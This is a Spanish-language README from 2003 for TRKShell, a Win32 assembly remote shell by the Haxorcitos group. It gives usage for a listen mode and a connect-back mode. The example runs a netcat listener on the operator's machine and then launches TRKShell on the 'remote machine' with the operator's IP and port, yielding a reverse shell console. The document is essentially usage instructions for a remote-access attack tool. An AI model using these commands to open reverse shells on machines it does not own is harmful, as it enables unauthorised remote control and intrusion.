
		 Win32ASM Remote Shell v0.1
		============================


Haxorcitos Win32ASM Remote Shell v0.1
Programado por Tarako@3wdesign.es
Pagina Web: http://www.3WDesign.es/security Copyright (c) 2003
	    http://www.croulder.com/haxorcitos


Probado bajo Windows 2000 SP3 y Windows XP


Uso:
----

* Modo Escucha:

   TRKShell.exe -l <Puerto>   

   Estando conetado al poner "exit" se cerrara la conexion, pero seguira a la escucha,
    poniendo "bye" se cerrara la conexion y tambien se cerrara el TRKShell.exe


* Modo Conexion
  
   TRKShell.exe -c <IP> <Puerto> 

   Estando conetado al poner "exit" se cerrara la conexion y tambien el TRKShell.exe

   Ejemplo: 1) Inicia un NetCat en tu maquina: 
               nc.exe -vv -L -p 64000

            2) Ejecuta el TRKShell.exe en la maquina remota: 
               TRKShell.exe -c <TuIP> 64000

            3) Ahora tendras una consola remota en el terminal donde estaba el NetCat




Contact Information:
--------------------

Tarako@3wdesign.es		- Enviar bugs / Informes
comercial@3wdesign.es		- Informacion Sobre auditorias de seguridad para su empresa.